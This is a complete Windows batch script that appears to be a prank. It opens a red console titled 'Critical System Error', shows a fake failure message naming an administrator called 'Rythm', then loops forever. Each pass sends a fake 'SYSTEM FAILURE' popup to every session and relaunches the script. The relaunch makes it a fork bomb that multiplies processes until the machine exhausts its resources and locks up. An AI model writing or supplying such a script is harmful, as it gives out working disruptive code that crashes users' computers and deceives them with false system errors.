@echo off
color c
title Critical System Error
echo.
echo SYSTEM ERROR: Unexpected Critical Failure!
echo Please contact System Administrator: Rythm immediately.
echo.
pause
:loop
msg * "ERROR: SYSTEM FAILURE! Process ID: %random%"
start "" cmd /c %0
goto loop